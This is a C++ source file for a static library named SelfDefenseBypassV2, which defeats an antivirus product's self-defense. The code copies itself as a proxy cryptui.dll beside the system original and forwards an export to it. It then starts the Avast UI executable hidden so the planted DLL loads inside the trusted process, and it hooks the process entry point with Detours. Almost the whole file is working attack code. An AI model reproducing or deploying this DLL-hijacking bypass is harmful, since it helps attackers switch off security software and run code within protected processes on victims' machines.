// SelfDefenseBypassV2.cpp : Defines the functions for the static library.
//

#include <Windows.h>
#include "SelfDefenseBypassV2.h"
#include "detours.h"
#include "wil/stl.h"
#include "wil/win32_helpers.h"
#include <string>
#include <filesystem>

#pragma comment(linker,"/export:CryptUIDlgViewCertificateW=cryptui_orig.CryptUIDlgViewCertificateW,@34")

namespace fs = std::filesystem;

namespace
{
    void CreateProcessWithSelf(const std::wstring &exeFilePath, const std::wstring &param1String, const std::wstring &param2String)
    {
        auto thisModuleBaseAddress =
            DetourGetContainingModule(DetourCodeFromPointer(CreateProcessWithSelf, nullptr));
        if (!thisModuleBaseAddress)
            throw std::runtime_error("DetourGetContainingModule failed");

        const auto thisModulePath =
            fs::path(wil::GetModuleFileNameW<std::wstring>(thisModuleBaseAddress));
        const auto thisModuleParentPath = thisModulePath.parent_path();

        if (!::SetDllDirectory(thisModuleParentPath.c_str()))
            throw std::runtime_error("SetDllDirectory failed. Error: " + std::to_string(::GetLastError()));

        fs::copy_file(thisModulePath, thisModuleParentPath / "cryptui.dll", fs::copy_options::overwrite_existing);
        fs::copy_file(
            LR"(C:\Windows\System32\cryptui.dll)", thisModuleParentPath / "cryptui_orig.dll", fs::copy_options::update_existing);

        auto commandLine = L"\"" + exeFilePath + L"\"";
        commandLine += L" ";
        commandLine += L"\"" + param1String + L"\"";
        commandLine += L" ";
        commandLine += L"\"" + param2String + L"\"";

        STARTUPINFO startupInfo = {};
        startupInfo.wShowWindow = SW_HIDE;
        startupInfo.cb = sizeof(startupInfo);

        wil::unique_process_information processInfo;

        if (!::CreateProcess(
            nullptr,
            const_cast<LPWSTR>(commandLine.c_str()),
            nullptr,
            nullptr,
            FALSE,
            0,
            nullptr,
            thisModuleParentPath.c_str(),
            &startupInfo,
            &processInfo))
            throw std::runtime_error("CreateProcessW failed. Error: " + std::to_string(::GetLastError()));
    }
} // anonymous namespace

void BypassSelfDefense(const wchar_t *parameter1, const wchar_t *parameter2)
{
    CreateProcessWithSelf(AvastUiExeFilePath, parameter1, parameter2);
}

EntryPointType DelayedExecute(EntryPointType detourEntryPoint)
{
    auto originalEntryPoint = reinterpret_cast<EntryPointType>(DetourGetEntryPoint(NULL));
    if (!originalEntryPoint)
        throw std::runtime_error("DetourGetEntryPoint failed: error " + std::to_string(::GetLastError()));

    auto returnValue = DetourTransactionBegin();
    if (returnValue != NO_ERROR)
        throw std::runtime_error("DetourTransactionBegin failed. Error " + std::to_string(returnValue));

    returnValue = DetourUpdateThread(::GetCurrentThread());
    if (returnValue != NO_ERROR)
        throw std::runtime_error("DetourUpdateThread failed. Error " + std::to_string(returnValue));

    returnValue = DetourAttach(&reinterpret_cast<PVOID &>(originalEntryPoint), detourEntryPoint);
    if (returnValue != NO_ERROR)
        throw std::runtime_error("DetourAttach failed. Error " + std::to_string(returnValue));

    returnValue = DetourTransactionCommit();
    if (returnValue != NO_ERROR)
        throw std::runtime_error("DetourTransactionCommit failed. Error " + std::to_string(returnValue));

    return originalEntryPoint;
}
